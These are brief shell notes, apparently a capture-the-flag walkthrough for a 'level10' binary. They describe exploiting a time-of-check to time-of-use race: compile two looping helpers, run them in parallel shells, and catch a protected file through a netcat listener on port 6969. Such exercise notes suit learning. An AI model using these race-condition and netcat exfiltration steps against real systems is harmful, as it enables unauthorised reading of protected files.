#show port who are listening
netstat -tulpn | grep LISTEN

./level10 /tmp/src_file 10.0.2.15

#reverse engineering => listen to 6969 port and send the file in 1st arg
#we try to create a port on the vm and send the file with it

#	https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
#	https://saketupadhyay.medium.com/winning-race-conditions-c80796f0e231

gcc -o force repeat_create_ln.c
gcc -o run repeat_level10.c

#in 3 shells in tmp
nc -l -k 6969 > /tmp/destination
./force
./run

cat /tmp/destination